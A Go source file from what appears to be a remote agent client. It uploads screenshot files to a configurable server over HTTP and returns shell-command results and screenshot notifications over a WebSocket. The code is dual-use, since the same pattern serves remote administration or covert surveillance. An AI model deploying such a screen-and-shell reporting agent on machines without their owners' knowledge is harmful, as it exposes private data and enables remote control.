package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
)

type SendFileCommand struct {
	wsc *WSClient
}

func (cmd *SendFileCommand) Send(filepath string) error {
	log.Println("Sending shot:", filepath)

	// Prepare endpoint data to send the file
	protocol := cmd.wsc.httpprotocol
	port := cmd.wsc.httpport
	domain := cmd.wsc.httpdomain
	uploaduri := cmd.wsc.uploaduri

	// Url to send the file
	posturl := fmt.Sprintf("%s://%s:%s%s", protocol, domain, port, uploaduri)

	// Read file
	file, err := os.Open(filepath)
	if err != nil {
		log.Printf("File %s to send not found in directory\n", filepath)
		log.Println("ERROR:", err)
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filepath)
	io.Copy(part, file)
	writer.Close()

	r, _ := http.NewRequest("POST", posturl, body)
	r.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	_, ee := client.Do(r)
	if ee != nil {
		log.Println("ERROR: ", ee)
	} else {
		log.Println("Sent!")
	}

	return nil
}

func NewSendFileCommand(wsc *WSClient) *SendFileCommand {
	return &SendFileCommand{
		wsc: wsc,
	}
}

type RespondServerCommand struct {
	wsc *WSClient
}

func (cmd *RespondServerCommand) SendBashResponse(bashres BashResponse) error {
	strbashres, _ := json.Marshal(bashres)
	return cmd.wsc.SendMessage(string(strbashres))
}

func (cmd *RespondServerCommand) SendScreenshotNotification(shotres ScreenshotNotification) error {
	strshotres, _ := json.Marshal(shotres)
	return cmd.wsc.SendMessage(string(strshotres))
}

func NewRespondServerCommand(wsc *WSClient) *RespondServerCommand {
	return &RespondServerCommand{
		wsc: wsc,
	}
}
